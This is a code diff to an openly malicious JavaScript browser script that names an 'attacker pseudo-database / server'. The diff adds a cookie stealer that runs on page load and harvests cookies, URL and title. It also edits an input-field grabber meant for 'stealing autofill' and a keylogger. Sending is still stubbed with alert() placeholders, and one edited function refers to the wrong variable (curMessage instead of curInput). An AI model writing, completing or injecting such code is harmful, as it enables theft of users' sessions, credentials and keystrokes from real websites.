@@ -1,6 +1,39 @@
 /* attacker pseudo-database / server */
 var host_url = "http://127.0.0.1:80/"
 
+/* Timestamp Strings */
+function createTimestamp() {
+    var now = new Date();
+    return now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
+}
+
+
+/* ## Cookies ## */
+
+document.addEventListener('readystatechange',event => {
+    /* Wait for the page to be fully loaded */
+    if (event.target.readyState === "complete") {
+        saveAndSendC();
+    }
+})
+
+function saveAndSendC() {
+    /* output JSON */
+    var curCookies = {}
+    /* Get current time */
+    curCookies['timestamp'] = createTimestamp();
+    /* Get current URL */
+    curCookies['url'] = document.URL;
+    /* Get current title */
+    curCookies['title'] = document.title;
+    /* Get cookies content */
+    curCookies['cookies'] = document.cookie;
+    alert(JSON.stringify(curCookies));
+}
+
+
+
+
 
 /* ## Input Field Grabber - Mainly for stealing autofill ## */
 
@@ -9,17 +42,16 @@ allInputs = document.getElementsByTagName('input');
 for (var i = 0; i < allInputs.length; i++) {
     /* When a field loses focus for the first time, save and send to catch autofilled fields */
     allInputs[i].addEventListener('blur',function(e) {
-        saveAndSendInputField(e.target);
+        saveAndSendIF(e.target);
     },{once:true});
 }
 
 /* Sends to an input field only endpoint */
-function saveAndSendInputField(target) {
+function saveAndSendIF(target) {
     /* output JSON */
     var curInput = {} 
     /* Get current time */
-    var now = new Date();
-    curInput['timestamp'] = now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
+    curMessage['timestamp'] = createTimestamp();
     /* Get current URL */
     curInput['url'] = document.URL;
     /* Get current title */
@@ -31,6 +63,9 @@ function saveAndSendInputField(target) {
     /* Send to remote server */
     alert(JSON.stringify(curInput)); // placeholder
 }
+
+
+
 
 
 /* ## Keylogger ## */
@@ -78,8 +113,7 @@ function saveAndSendKS() {
     /* output JSON */
     var curMessage = {} 
     /* Get current time */
-    var now = new Date();
-    curMessage['timestamp'] = now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
+    curMessage['timestamp'] = createTimestamp();
     /* Get current URL */
     curMessage['url'] = document.URL;
     /* Get current title */
